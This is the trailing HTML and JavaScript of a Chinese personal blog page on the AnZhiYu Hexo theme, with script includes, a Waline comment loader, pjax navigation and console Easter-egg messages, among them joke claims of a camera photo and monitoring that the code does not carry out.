anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2024 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 VVkladg0r 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initWaline = () => {
    const waline = Waline.init(Object.assign({
      el: '#waline-wrap',
      serverURL: 'waline.cszvvds.cc',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: false,
    }, null))
  }

  const loadWaline = async () => {
    if (typeof Waline === 'object') initWaline()
    else {
      await getCSS('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.css')
      await getScript('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.js')
      initWaline()
    }
  }

  if ('Waline' === 'Waline' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = content => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = async () => {
    try {
      const res = await fetch('waline.cszvvds.cc/api/comment?type=recent&count=6', { method: 'GET' })
      const result = await res.json()
      const walineArray = result.data.map(e => {
        return {
          'content': changeContent(e.comment),
          'avatar': e.avatar,
          'nick': e.nick,
          'url': e.url + '#' + e.objectId,
          'date': e.time || e.insertedAt
        }
      })
      saveToLocal.set('waline-newest-comments', JSON.stringify(walineArray), 10/(60*24))
      generateHtml(walineArray)
    } catch (err) {
      console.error(err)
      const $dom = document.querySelector('#card-newest-comments .aside-list')
      $dom.textContent= "无法获取评论，请确认相关配置是否正确"
    }
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('waline-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>